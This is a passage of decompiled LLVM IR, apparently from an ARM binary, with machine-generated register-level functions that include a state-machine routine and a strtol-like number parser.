dec_label_pc_129d4:                               ; preds = %dec_label_pc_129b4, %dec_label_pc_12970, %dec_label_pc_12954, %dec_label_pc_129c8
  %v0_129d4 = call i32 @function_12b14()
  store i32 %v0_129d4, i32* %r0.global-to-local, align 4
  %v0_129d8.pre = load i32, i32* @r1, align 4
  %v1_129d8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129c8, %dec_label_pc_129d4
  %v1_129d8 = phi i32 [ %v3_129c0, %dec_label_pc_129c8 ], [ %v1_129d8.pre, %dec_label_pc_129d4 ]
  %v0_129d8 = phi i32 [ %v3_129b4, %dec_label_pc_129c8 ], [ %v0_129d8.pre, %dec_label_pc_129d4 ]
  %v2_129d8 = add i32 %v1_129d8, 8
  %v3_129d8 = inttoptr i32 %v2_129d8 to i32*
  store i32 %v0_129d8, i32* %v3_129d8, align 4
  %v0_129dc = load i32, i32* %r2.global-to-local, align 4
  %v1_129dc = load i32, i32* %r1.global-to-local, align 4
  %v2_129dc = add i32 %v1_129dc, 12
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  store i32 %v0_129dc, i32* %v3_129dc, align 4
  %v0_129e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_129e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_129e0 = add i32 %v1_129e0, %v0_129e0
  store i32 %v2_129e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129a0.dec_label_pc_129e4_crit_edge, %dec_label_pc_129d8
  %v0_129f4 = phi i32 [ %v0_129f4.pre, %dec_label_pc_129a0.dec_label_pc_129e4_crit_edge ], [ %v2_129e0, %dec_label_pc_129d8 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_129e8 = load i32, i32* @r7, align 4
  %v2_129e8 = add i32 %v0_129e8, 32
  %v3_129e8 = inttoptr i32 %v2_129e8 to i32*
  %v4_129e8 = load i32, i32* %v3_129e8, align 4
  %v1_129ec = add i32 %v4_129e8, 52
  store i32 %v1_129ec, i32* %r3.global-to-local, align 4
  %v1_129f0 = add i32 %v4_129e8, 60
  %v2_129f0 = inttoptr i32 %v1_129f0 to i32*
  %v3_129f0 = load i32, i32* %v2_129f0, align 4
  store i32 %v3_129f0, i32* %r1.global-to-local, align 4
  %v1_129f4 = or i32 %v0_129f4, 1
  store i32 %v1_129f4, i32* %r2.global-to-local, align 4
  %v1_129f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_129f8 = add i32 %v1_129f8, 12
  %v3_129f8 = inttoptr i32 %v2_129f8 to i32*
  store i32 %v1_129ec, i32* %v3_129f8, align 4
  %v0_129fc = load i32, i32* %r1.global-to-local, align 4
  %v1_129fc = load i32, i32* %r4.global-to-local, align 4
  %v2_129fc = add i32 %v1_129fc, 8
  %v3_129fc = inttoptr i32 %v2_129fc to i32*
  store i32 %v0_129fc, i32* %v3_129fc, align 4
  %v0_12a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a00 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a00 = add i32 %v1_12a00, 4
  %v3_12a00 = inttoptr i32 %v2_12a00 to i32*
  store i32 %v0_12a00, i32* %v3_12a00, align 4
  %v0_12a04 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a04 = load i32, i32* %r4.global-to-local, align 4
  %v3_12a04 = add i32 %v1_12a04, %v0_12a04
  %v4_12a04 = inttoptr i32 %v3_12a04 to i32*
  store i32 %v0_12a04, i32* %v4_12a04, align 4
  %v0_12a08 = load i32, i32* %r4.global-to-local, align 4
  %v1_12a08 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a08 = add i32 %v1_12a08, 12
  %v3_12a08 = inttoptr i32 %v2_12a08 to i32*
  store i32 %v0_12a08, i32* %v3_12a08, align 4
  %v0_12a0c = load i32, i32* %r4.global-to-local, align 4
  %v1_12a0c = load i32, i32* %r3.global-to-local, align 4
  %v2_12a0c = add i32 %v1_12a0c, 8
  %v3_12a0c = inttoptr i32 %v2_12a0c to i32*
  store i32 %v0_12a0c, i32* %v3_12a0c, align 4
  br label %dec_label_pc_12a24

dec_label_pc_12a14:                               ; preds = %dec_label_pc_12988
  %v2_12a14 = add i32 %v1_12998, %v0_12a14
  store i32 %v2_12a14, i32* %ip.global-to-local, align 4
  %v1_12a18 = or i32 %v2_12a14, 1
  store i32 %v1_12a18, i32* %r3.global-to-local, align 4
  %v0_12a1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a1c, i32* %v2_12990, align 4
  %v0_12a20 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a20 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a20 = add i32 %v1_12a20, 4
  %v3_12a20 = inttoptr i32 %v2_12a20 to i32*
  store i32 %v0_12a20, i32* %v3_12a20, align 4
  br label %dec_label_pc_12a24

dec_label_pc_12a24:                               ; preds = %dec_label_pc_129e4, %dec_label_pc_12a14
  %v0_12a24 = load i32, i32* %ip.global-to-local, align 4
  %v3_12a28 = icmp ult i32 %v0_12a24, 131070
  br i1 %v3_12a28, label %dec_label_pc_12a94, label %dec_label_pc_12a2c

dec_label_pc_12a2c:                               ; preds = %dec_label_pc_12a24
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12a30 = load i32, i32* @r7, align 4
  %v2_12a30 = add i32 %v0_12a30, 32
  %v3_12a30 = inttoptr i32 %v2_12a30 to i32*
  %v4_12a30 = load i32, i32* %v3_12a30, align 4
  store i32 %v4_12a30, i32* @r4, align 4
  %v1_12a34 = inttoptr i32 %v4_12a30 to i32*
  %v2_12a34 = load i32, i32* %v1_12a34, align 4
  store i32 %v2_12a34, i32* %r3.global-to-local, align 4
  %v1_12a38 = and i32 %v2_12a34, 2
  %v2_12a38 = icmp eq i32 %v1_12a38, 0
  br i1 %v2_12a38, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12a2c
  store i32 %v4_12a30, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12a2c, %bb
  store i32 76356, i32* @lr, align 4
  %v1_12a40 = xor i1 %v2_12a38, true
  call void @__pseudo_cond_branch(i1 %v1_12a40, i32 ptrtoint (i32* @global_var_126e4.400 to i32))
  %v0_12a44 = load i32, i32* @r4, align 4
  %v1_12a44 = add i32 %v0_12a44, 44
  %v2_12a44 = inttoptr i32 %v1_12a44 to i32*
  %v3_12a44 = load i32, i32* %v2_12a44, align 4
  store i32 %v3_12a44, i32* %r3.global-to-local, align 4
  %v1_12a48 = add i32 %v3_12a44, 4
  %v2_12a48 = inttoptr i32 %v1_12a48 to i32*
  %v3_12a48 = load i32, i32* %v2_12a48, align 4
  store i32 %v3_12a48, i32* %r3.global-to-local, align 4
  %v1_12a4c = add i32 %v0_12a44, 836
  %v2_12a4c = inttoptr i32 %v1_12a4c to i32*
  %v3_12a4c = load i32, i32* %v2_12a4c, align 4
  store i32 %v3_12a4c, i32* %r2.global-to-local, align 4
  %v1_12a50 = and i32 %v3_12a48, -4
  store i32 %v1_12a50, i32* %r3.global-to-local, align 4
  %v3_12a54 = icmp ult i32 %v1_12a50, %v3_12a4c
  br i1 %v3_12a54, label %dec_label_pc_12a94, label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %bb15
  store i32 %v0_12a44, i32* %r1.global-to-local, align 4
  %v1_12a60 = add i32 %v0_12a44, 840
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* %r0.global-to-local, align 4
  %v2_12a64 = call i32 @function_12634(i32 %v3_12a60, i32 %v0_12a44)
  store i32 %v2_12a64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a94

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_12930
  %v2_12a6c = inttoptr i32 %v1_12900 to i32*
  %v3_12a6c = load i32, i32* %v2_12a6c, align 4
  store i32 %v3_12a6c, i32* %r0.global-to-local, align 4
  %v1_12a70 = add i32 %v4_128f0, 848
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %r2.global-to-local, align 4
  %v1_12a74 = add i32 %v4_128f0, 868
  %v2_12a74 = inttoptr i32 %v1_12a74 to i32*
  %v3_12a74 = load i32, i32* %v2_12a74, align 4
  %v2_12a78 = add i32 %v3_12a6c, %v1_128fc
  store i32 %v2_12a78, i32* %r1.global-to-local, align 4
  %v1_12a7c = add i32 %v3_12a70, -1
  store i32 %v1_12a7c, i32* %r2.global-to-local, align 4
  %v2_12a80 = sub i32 %v3_12a74, %v2_12a78
  store i32 %v2_12a80, i32* %r3.global-to-local, align 4
  store i32 %v2_12a80, i32* %v2_12a74, align 4
  %v1_12a88 = load i32, i32* @lr, align 4
  %v2_12a88 = add i32 %v1_12a88, 848
  %v3_12a88 = inttoptr i32 %v2_12a88 to i32*
  store i32 %v1_12a7c, i32* %v3_12a88, align 4
  %v0_12a8c = load i32, i32* %r0.global-to-local, align 4
  %v1_12a8c = load i32, i32* @r5, align 4
  %v2_12a8c = sub i32 %v1_12a8c, %v0_12a8c
  store i32 %v2_12a8c, i32* %r0.global-to-local, align 4
  %v4_12a90 = call i32 @function_1407c(i32 %v2_12a8c, i32 %v2_12a78, i32 %v1_12a7c, i32 %v2_12a80)
  store i32 %v4_12a90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a94

dec_label_pc_12a94:                               ; preds = %bb15, %dec_label_pc_12a24, %dec_label_pc_12a5c, %dec_label_pc_12910, %dec_label_pc_12a6c
  store i32 %v2_128a4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_12aa0 = load i32, i32* @r7, align 4
  %v2_12aa0 = add i32 %v0_12aa0, 24
  %v3_12aa0 = inttoptr i32 %v2_12aa0 to i32*
  %v4_12aa0 = load i32, i32* %v3_12aa0, align 4
  store i32 %v4_12aa0, i32* @ip, align 4
  store i32 76460, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12aa0)
  br label %dec_label_pc_12aac

dec_label_pc_12aac:                               ; preds = %dec_label_pc_12898, %dec_label_pc_12a94
  store i32 %v3_12898, i32* @r4, align 4
  store i32 %v6_12898, i32* @r5, align 4
  store i32 %v9_12898, i32* @r6, align 4
  store i32 %v12_12898, i32* @r7, align 4
  store i32 %v18_12898, i32* @lr, align 4
  ret i32 %v2_128a4

; uselistorder directives
  uselistorder i32 %v0_12a44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12a04, { 1, 0 }
  uselistorder i32 %v1_12944, { 1, 0 }
  uselistorder i32 %v0_12944, { 1, 0 }
  uselistorder i32 %v3_12918, { 1, 0 }
  uselistorder i32 %v1_128fc, { 1, 0, 2 }
  uselistorder i32 %v2_128f8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_128f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_128a0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 0, 1, 2, 8, 4, 5, 9, 6, 10, 11, 12, 14, 13 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_12aac, { 1, 0 }
  uselistorder label %dec_label_pc_12a94, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12a24, { 1, 0 }
  uselistorder label %dec_label_pc_129e4, { 1, 0 }
  uselistorder label %dec_label_pc_129d8, { 1, 0 }
  uselistorder label %dec_label_pc_129d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12988, { 1, 0 }
}

define i32 @function_12abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12abc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_12abc = load i1, i1* @cpsr_z, align 1
  %v2_12abc = load i32, i32* @r4, align 4
  br i1 %v0_12abc, label %bb, label %dec_label_pc_12abc..thread4_crit_edge

dec_label_pc_12abc..thread4_crit_edge:            ; preds = %dec_label_pc_12abc
  %v0_12ae8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_12abc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12abc..thread4_crit_edge, %bb
  %v0_12ae8 = phi i32 [ %v0_12ae8.pre, %dec_label_pc_12abc..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_12abc, i32* %stack_var_-12, align 4
  %v6_12ad4 = load i32, i32* @r5, align 4
  %v9_12ad4 = load i32, i32* @lr, align 4
  %v4_12ae4 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_12ae4, i32* @r5, align 4
  store i32 %v0_12ae8, i32* @r4, align 4
  store i32 %v4_12ae4, i32* @r0, align 4
  %v0_12af4 = call i32 @function_126e4()
  %v0_12af8 = load i32, i32* @r4, align 4
  store i32 %v0_12af8, i32* %r0.global-to-local, align 4
  %v0_12afc = load i32, i32* @r5, align 4
  %v2_12b04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12b04, i32* @r4, align 4
  store i32 %v6_12ad4, i32* @r5, align 4
  store i32 %v9_12ad4, i32* @lr, align 4
  %v2_12b08 = call i32 @function_12634(i32 %v0_12af8, i32 %v0_12afc)
  store i32 %v2_12b08, i32* %r0.global-to-local, align 4
  %v0_12b0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b0c, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_12b10 = phi i32 [ %v2_12b08, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_12b10

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_12634, { 1, 0 }
  uselistorder i32 ()* @function_126e4, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 124836 to i32*), { 15, 5, 6, 7, 8, 9, 4, 10, 3, 11, 0, 12, 13, 2, 14, 1 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12b14() local_unnamed_addr {
dec_label_pc_12b14:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 124804, i32* @r5, align 4
  %v4_12b2c = load i32, i32* inttoptr (i32 124820 to i32*), align 4
  store i32 76600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b2c)
  %v2_12b48 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_12b54 = call i32 @function_10da0(i32 1, i32 %v2_12b48, i32 0)
  %v4_12b5c = load i32, i32* @global_var_1ea1c.408, align 4
  %v2_12b60 = icmp eq i32 %v4_12b5c, 0
  br i1 %v2_12b60, label %dec_label_pc_12b68, label %dec_label_pc_12ba8

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b14
  store i32 1, i32* @global_var_1ea1c.408, align 4
  br label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12bb8, %dec_label_pc_12b68
  %v0_12b74 = load i32, i32* @r5, align 4
  %v2_12b74 = add i32 %v0_12b74, 160
  store i32 %v2_12b74, i32* @r4, align 4
  %v2_12b80 = add i32 %v0_12b74, 36
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  %v4_12b80 = load i32, i32* %v3_12b80, align 4
  call void @__pseudo_branch(i32 %v4_12b80)
  %v1_12b90 = call i32 @function_1161c(i32 6)
  %v0_12b9c = load i32, i32* @r5, align 4
  %v2_12b9c = add i32 %v0_12b9c, 16
  %v3_12b9c = inttoptr i32 %v2_12b9c to i32*
  %v4_12b9c = load i32, i32* %v3_12b9c, align 4
  store i32 76712, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b9c)
  %v4_12bac.pre = load i32, i32* @global_var_1ea1c.408, align 4
  br label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12b14, %dec_label_pc_12b70
  %v0_12bbc = phi i32 [ %v4_12b5c, %dec_label_pc_12b14 ], [ %v4_12bac.pre, %dec_label_pc_12b70 ]
  %v7_12bb0 = icmp eq i32 %v0_12bbc, 1
  br i1 %v7_12bb0, label %dec_label_pc_12bb8, label %dec_label_pc_12bf4

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12ba8
  %v2_12bb8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12bb8, i32* @r4, align 4
  store i32 2, i32* @global_var_1ea1c.408, align 4
  store i32 20, i32* @r2, align 4
  %v2_12bd0 = bitcast i32* %stack_var_-28 to i8*
  %v3_12bd0 = call i32 @function_11250(i8* %v2_12bd0, i32 0)
  %v3_12bec = call i32 @function_13b7c(i32 6, i32 %v2_12bb8, i32 0)
  br label %dec_label_pc_12b70

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12ba8
  %v7_12bf4 = icmp eq i32 %v0_12bbc, 2
  br i1 %v7_12bf4, label %dec_label_pc_12bfc, label %dec_label_pc_12c08

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bf4
  store i32 3, i32* @global_var_1ea1c.408, align 4
  %v0_12c04 = call i32 @function_12b14()
  %v4_12c08.pre = load i32, i32* @global_var_1ea1c.408, align 4
  br label %dec_label_pc_12c08

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12bf4, %dec_label_pc_12bfc
  %v1_12c10 = phi i32 [ %v0_12bbc, %dec_label_pc_12bf4 ], [ %v4_12c08.pre, %dec_label_pc_12bfc ]
  %v7_12c0c = icmp eq i32 %v1_12c10, 3
  br i1 %v7_12c0c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12c08
  store i32 4, i32* @global_var_1ea1c.408, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12c08, %bb
  call void @__pseudo_cond_branch(i1 %v7_12c0c, i32 ptrtoint (i32* @global_var_1416c.410 to i32))
  br label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c20, %.thread1
  %v0_12c20 = call i32 @function_12b14()
  br label %dec_label_pc_12c20

; uselistorder directives
  uselistorder i32 ()* @function_12b14, { 2, 1, 6, 0, 4, 5, 3 }
  uselistorder i32 6, { 14, 15, 68, 3, 31, 32, 17, 27, 18, 28, 19, 29, 16, 30, 1, 33, 20, 34, 0, 4, 35, 36, 37, 5, 38, 39, 40, 41, 6, 42, 43, 44, 45, 7, 46, 8, 47, 48, 21, 49, 9, 50, 51, 52, 22, 53, 10, 54, 55, 56, 23, 57, 58, 59, 24, 60, 11, 61, 62, 63, 64, 25, 65, 12, 66, 69, 70, 71, 72, 73, 26, 74, 13, 75, 2, 67 }
  uselistorder i32* @global_var_1ea1c.408, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 124820 to i32*), { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12c08, { 1, 0 }
  uselistorder label %dec_label_pc_12ba8, { 1, 0 }
}

define i32 @function_12c2c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c2c:
  %v0_12c2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c2c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12c2c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12c2c, %bb
  %v4_12c38 = phi i32 [ %arg1, %dec_label_pc_12c2c ], [ 0, %bb ]
  ret i32 %v4_12c38

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12c3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c3c:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12c4c = call i32 @function_12c5c()
  ret i32 %v0_12c4c
}

define i32 @function_12c5c() local_unnamed_addr {
dec_label_pc_12c5c:
  store i32 1, i32* @r3, align 4
  %v0_12c68 = call i32 @function_12c78()
  ret i32 %v0_12c68
}

define i32 @function_12c78() local_unnamed_addr {
dec_label_pc_12c78:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_12c78 = load i32, i32* @r4, align 4
  store i32 224, i32* @lr, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v0_12c8c = load i32, i32* @r1, align 4
  store i32 %v0_12c8c, i32* %fp.global-to-local, align 4
  %v0_12c90 = load i32, i32* @r2, align 4
  store i32 %v0_12c90, i32* %r5.global-to-local, align 4
  %v0_12c94 = load i32, i32* @r0, align 4
  store i32 %v0_12c94, i32* @r4, align 4
  %v0_12c98 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12ca4

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12ca4
  %v1_12ca0 = add i32 %v0_12cdc, 1
  store i32 %v1_12ca0, i32* @r4, align 4
  br label %dec_label_pc_12ca4

dec_label_pc_12ca4:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12ca0
  %v0_12cdc = phi i32 [ %v0_12c94, %dec_label_pc_12c78 ], [ %v1_12ca0, %dec_label_pc_12ca0 ]
  %v1_12ca4 = inttoptr i32 %v0_12cdc to i8*
  %v2_12ca4 = load i8, i8* %v1_12ca4, align 1
  %v3_12ca4 = zext i8 %v2_12ca4 to i32
  %v4_12ca8 = load i32, i32* inttoptr (i32 125028 to i32*), align 4
  %v2_12cac = mul nuw nsw i32 %v3_12ca4, 2
  %v2_12cb0 = add i32 %v2_12cac, %v4_12ca8
  %v3_12cb0 = inttoptr i32 %v2_12cb0 to i16*
  %v4_12cb0 = load i16, i16* %v3_12cb0, align 2
  %v1_12cb4 = and i16 %v4_12cb0, 32
  %v2_12cb4 = icmp eq i16 %v1_12cb4, 0
  br i1 %v2_12cb4, label %dec_label_pc_12cbc, label %dec_label_pc_12ca0

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12ca4
  %v7_12cbc = icmp eq i8 %v2_12ca4, 43
  br i1 %v7_12cbc, label %dec_label_pc_12cdc, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12cbc
  %v7_12cc4 = icmp eq i8 %v2_12ca4, 45
  br i1 %v7_12cc4, label %dec_label_pc_12cdc, label %bb

bb:                                               ; preds = %dec_label_pc_12cc4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12ce0

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cbc, %dec_label_pc_12cc4
  %storemerge39 = phi i32 [ 1, %dec_label_pc_12cc4 ], [ 0, %dec_label_pc_12cbc ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_12cdc = add i32 %v0_12cdc, 1
  store i32 %v1_12cdc, i32* @r4, align 4
  br label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %bb, %dec_label_pc_12cdc
  %v0_12d00 = phi i32 [ %v0_12cdc, %bb ], [ %v1_12cdc, %dec_label_pc_12cdc ]
  %v1_12ce0 = and i32 %v0_12c90, -17
  %v3_12ce0 = icmp eq i32 %v1_12ce0, 0
  br i1 %v3_12ce0, label %dec_label_pc_12cec, label %bb52

bb52:                                             ; preds = %dec_label_pc_12ce0
  store i32 %v0_12c94, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12ce0
  %v1_12cec = inttoptr i32 %v0_12d00 to i8*
  %v2_12cec = load i8, i8* %v1_12cec, align 1
  %v7_12cf0 = icmp eq i8 %v2_12cec, 48
  %v1_12cf4 = add i32 %v0_12c90, 10
  store i32 %v1_12cf4, i32* %r5.global-to-local, align 4
  br i1 %v7_12cf0, label %dec_label_pc_12d00, label %bb53

bb53:                                             ; preds = %dec_label_pc_12cec
  store i32 %v0_12c94, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cec
  %v1_12d00 = add i32 %v0_12d00, 1
  %v2_12d00 = inttoptr i32 %v1_12d00 to i8*
  %v3_12d00 = load i8, i8* %v2_12d00, align 1
  %v4_12d00 = zext i8 %v3_12d00 to i32
  store i32 %v1_12d00, i32* @r4, align 4
  %v1_12d04 = or i32 %v4_12d00, 32
  %v7_12d08 = icmp eq i32 %v1_12d04, 120
  %v1_12d0c = add i32 %v0_12c90, 8
  store i32 %v1_12d0c, i32* %r5.global-to-local, align 4
  store i32 %v1_12d00, i32* %r6.global-to-local, align 4
  br i1 %v7_12d08, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_12d00
  %v3_12d18 = mul i32 %v1_12d0c, 2
  store i32 %v3_12d18, i32* %r5.global-to-local, align 4
  %v2_12d1c = add i32 %v0_12d00, 2
  store i32 %v2_12d1c, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12d00, %bb53, %bb54
  %v0_12d20 = phi i32 [ %v1_12cf4, %bb53 ], [ %v3_12d18, %bb54 ], [ %v1_12d0c, %dec_label_pc_12d00 ]
  %v5_12d24 = icmp slt i32 %v0_12d20, 16
  br i1 %v5_12d24, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_12d3c = phi i32 [ %v0_12c90, %bb52 ], [ %v0_12d20, %.thread8 ], [ 16, %bb55 ]
  %v1_12d28 = add i32 %v0_12d3c, -2
  %tmp = icmp ugt i32 %v1_12d28, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12d38

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12d38:                               ; preds = %bb56
  %v2_12d40 = call i32 @function_10970(i32 -1, i32 %v0_12d3c)
  store i32 -1, i32* @r0, align 4
  %v0_12d4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d4c, i32* @r1, align 4
  %v1_12d50 = urem i32 %v0_12d3c, 256
  store i32 %v1_12d50, i32* %sl.global-to-local, align 4
  %v0_12d54 = call i32 @function_10874()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_12d54, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_12d6c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12d6c

dec_label_pc_12d68:                               ; preds = %bb63, %dec_label_pc_12dc8
  %v0_12d68 = phi i32 [ %v1_12da836, %bb63 ], [ %v0_12d68.pre, %dec_label_pc_12dc8 ]
  store i32 %v0_12d68, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d38, %dec_label_pc_12d68
  %v0_12da8 = phi i32 [ %v0_12d6c.pre, %dec_label_pc_12d38 ], [ %v0_12d68, %dec_label_pc_12d68 ]
  %v1_12d6c = inttoptr i32 %v0_12da8 to i8*
  %v2_12d6c = load i8, i8* %v1_12d6c, align 1
  %v3_12d6c = zext i8 %v2_12d6c to i32
  %v1_12d70 = add nsw i32 %v3_12d6c, -48
  %v1_12d74 = urem i32 %v1_12d70, 256
  %v1_12d7c = or i32 %v3_12d6c, 32
  %tmp71 = icmp ult i32 %v1_12d74, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12d6c
  %tmp72 = icmp ugt i32 %v1_12d7c, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12d84
  %v1_12d88 = add nsw i32 %v1_12d7c, -87
  %v5_12d90 = urem i32 %v1_12d88, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12d6c, %dec_label_pc_12d84, %bb57
  %v3_12dc0 = phi i32 [ %v1_12d74, %dec_label_pc_12d6c ], [ 40, %dec_label_pc_12d84 ], [ %v5_12d90, %bb57 ]
  %v1_12d94 = load i32, i32* %r5.global-to-local, align 4
  %v6_12d98 = icmp slt i32 %v3_12dc0, %v1_12d94
  br i1 %v6_12d98, label %dec_label_pc_12d9c, label %dec_label_pc_12de4.loopexit

dec_label_pc_12d9c:                               ; preds = %bb58
  %v0_12d9c = load i32, i32* %ip.global-to-local, align 4
  %v1_12d9c = load i32, i32* %r8.global-to-local, align 4
  %v9_12d9c = icmp eq i32 %v0_12d9c, %v1_12d9c
  br i1 %v9_12d9c, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_12d9c
  %v1_12da832 = add i32 %v0_12da8, 1
  store i32 %v1_12da832, i32* %r4.global-to-local, align 4
